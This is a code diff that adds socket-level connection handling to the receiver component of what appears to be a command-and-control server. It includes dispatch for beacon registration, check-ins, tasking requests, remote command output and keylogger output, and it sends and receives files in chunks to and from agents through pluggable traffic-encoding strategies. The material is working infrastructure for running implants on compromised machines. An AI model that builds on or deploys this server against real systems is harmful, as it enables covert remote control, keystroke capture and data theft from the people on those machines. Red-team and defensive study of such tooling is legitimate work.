@@ -5,7 +5,12 @@ from dataclasses import dataclass
 from PyQt6.QtCore import QObject, pyqtSignal, QMetaObject, Qt, pyqtSlot
 import threading
 import time
+import socket
+from pathlib import Path
+from werkzeug.utils import secure_filename
 from .encoding_strategies import EncodingStrategy
+import utils
+from config import ServerConfig
 
 class ReceiverStatus(Enum):
     """Receiver status enumeration"""
@@ -248,3 +253,212 @@ class BaseReceiver(QObject):
         minutes = (uptime % 3600) // 60
         seconds = uptime % 60
         return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
+    
+    # Common connection handling methods
+    def _send_all(self, sock: socket.socket, data: bytes) -> int:
+        """Ensure all data is sent via socket"""
+        total_sent = 0
+        while total_sent < len(data):
+            sent = sock.send(data[total_sent:])
+            if sent == 0:
+                raise RuntimeError("Socket connection broken")
+            total_sent += sent
+        return total_sent
+    
+    @abstractmethod
+    def _send_data(self, sock: socket.socket, data: bytes) -> bool:
+        """Send data through the receiver's transport layer"""
+        pass
+    
+    @abstractmethod
+    def _receive_data(self, sock: socket.socket, buffer_size: int) -> bytes:
+        """Receive data through the receiver's transport layer"""
+        pass
+    
+    def handle_file_transfer(self, sock: socket.socket, command: str, parts: list, client_address: tuple):
+        """Handle file transfer with encoding - common implementation"""
+        if len(parts) < 2:
+            response = self.encoding_strategy.encode(b"ERROR|Invalid file transfer command")
+            self._send_data(sock, response)
+            return
+            
+        filename = parts[1]
+        config = ServerConfig()
+        
+        if command == "to_agent":
+            # Send file (encoded)
+            self._send_file(sock, filename, config)
+        else:  # from_agent
+            # Receive file (encoded)
+            ready_response = self.encoding_strategy.encode(b"READY")
+            self._send_data(sock, ready_response)
+            self._receive_file(sock, filename, config)
+    
+    def _send_file(self, sock: socket.socket, filename: str, config) -> bool:
+        """Send file with encoding"""
+        try:
+            filepath = Path(config.FILES_FOLDER) / secure_filename(filename)
+            if not filepath.exists():
+                error_response = self.encoding_strategy.encode(b'ERROR|File not found')
+                self._send_data(sock, error_response)
+                return False
+                
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
+            
+            CHUNK_SIZE = 1048576
+            bytes_sent = 0
+            
+            with open(filepath, 'rb') as f:
+                while True:
+                    chunk = f.read(CHUNK_SIZE)
+                    if not chunk:
+                        break
+                        
+                    # Encode the chunk
+                    encoded_chunk = self.encoding_strategy.encode(chunk)
+                    bytes_sent += self._send_all(sock, encoded_chunk)
+                    self.update_bytes_sent(len(encoded_chunk))
+                    
+            if utils.logger:
+                utils.logger.log_message(f"File transfer complete: {filename} ({bytes_sent} bytes)")
+            return True
+            
+        except Exception as e:
+            if utils.logger:
+                utils.logger.log_message(f"Error in file send: {e}")
+            return False
+            
+    def _receive_file(self, sock: socket.socket, filename: str, config) -> bool:
+        """Receive file with decoding"""
+        try:
+            filepath = Path(config.FILES_FOLDER) / secure_filename(filename)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1048576)
+            
+            with open(filepath, 'wb') as f:
+                total_received = 0
+                while True:
+                    try:
+                        encoded_chunk = self._receive_data(sock, 1048576)
+                        if not encoded_chunk:
+                            break
+                            
+                        # Decode the chunk
+                        chunk = self.encoding_strategy.decode(encoded_chunk)
+                        f.write(chunk)
+                        
+                        total_received += len(encoded_chunk)
+                        self.update_bytes_received(len(encoded_chunk))
+                        
+                    except socket.timeout:
+                        if total_received > 0:
+                            break
+                        raise
+                        
+            if total_received > 0:
+                success_response = self.encoding_strategy.encode(b'SUCCESS')
+                self._send_data(sock, success_response)
+                self.update_bytes_sent(len(success_response))
+                if utils.logger:
+                    utils.logger.log_message(f"File received: {filename} ({total_received} bytes)")
+                return True
+            else:
+                error_response = self.encoding_strategy.encode(b'ERROR|No data received')
+                self._send_data(sock, error_response)
+                return False
+                
+        except Exception as e:
+            if utils.logger:
+                utils.logger.log_message(f"Error in file receive: {e}")
+            return False
+    
+    def handle_command_processing(self, sock: socket.socket, initial_data: str, client_address: tuple):
+        """Handle command processing with encoding - common implementation"""
+        try:
+            keep_alive = self._process_command(sock, initial_data)
+            if not keep_alive:
+                return
+                
+            while True:
+                try:
+                    data_raw = self._receive_data(sock, getattr(self, 'buffer_size', 1048576))
+                    if not data_raw:
+                        break
+                        
+                    data_decoded = self.encoding_strategy.decode(data_raw)
+                    data = data_decoded.decode('utf-8').strip()
+                    self.update_bytes_received(len(data_raw))
+                    
+                    keep_alive = self._process_command(sock, data)
+                    if not keep_alive:
+                        break
+                        
+                except socket.timeout:
+                    continue
+                except Exception as e:
+                    if utils.logger:
+                        utils.logger.log_message(f"Error processing command from {client_address}: {e}")
+                    break
+                    
+        except Exception as e:
+            if utils.logger:
+                utils.logger.log_message(f"Error in command handler for {client_address}: {e}")
+    
+    def _process_command(self, sock: socket.socket, data: str) -> bool:
+        """Process individual commands with encoding - common implementation"""
+        single_transaction_commands = {
+            "register", "request_action", "checkin", "command_output", "keylogger_output"
+        }
+        
+        parts = data.split('|')
+        if not parts:
+            error_response = self.encoding_strategy.encode(b"Invalid command format")
+            self._send_data(sock, error_response)
+            self.update_bytes_sent(len(error_response))
+            return False
+            
+        command = parts[0]
+        
+        try:
+            # Use existing command processor logic
+            if command == "command_output" and len(parts) >= 2:
+                beacon_id = parts[1]
+                output = '|'.join(parts[2:]) if len(parts) > 2 else ""
+                response = self.command_processor.process_command_output(beacon_id, output)
+            elif command == "keylogger_output" and len(parts) >= 2:
+                beacon_id = parts[1]
+                output = data.split('|', 2)[2] if len(parts) > 2 else ""
+                response = self.command_processor.process_keylogger_output(beacon_id, output)
+            else:
+                # Standard command dispatch
+                response = {
+                    "register": lambda: self.command_processor.process_registration(
+                        parts[1], parts[2], self.receiver_id, self.name
+                    ) if len(parts) == 3 else "Invalid registration format",
+                    
+                    "request_action": lambda: self.command_processor.process_action_request(
+                        parts[1], self.receiver_id, self.name
+                    ) if len(parts) == 2 else "Invalid request format",
+                    
+                    "download_complete": lambda: self.command_processor.process_download_status(
+                        parts[1], parts[2], "download_complete"
+                    ) if len(parts) == 3 else "Invalid download status format",
+                    
+                    "download_failed": lambda: self.command_processor.process_download_status(
+                        parts[1], parts[2], "download_failed"
+                    ) if len(parts) == 3 else "Invalid download status format",
+                    
+                    "checkin": lambda: "Check-in acknowledged"
+                        if len(parts) == 2 else "Invalid checkin format",
+                }.get(command, lambda: "Unknown command")()
+                
+            # Encode and send response
+            encoded_response = self.encoding_strategy.encode(response.encode('utf-8'))
+            self._send_data(sock, encoded_response)
+            self.update_bytes_sent(len(encoded_response))
+            
+            return command not in single_transaction_commands
+            
+        except Exception as e:
+            if utils.logger:
+                utils.logger.log_message(f"Error processing command {command}: {e}")
+            return False
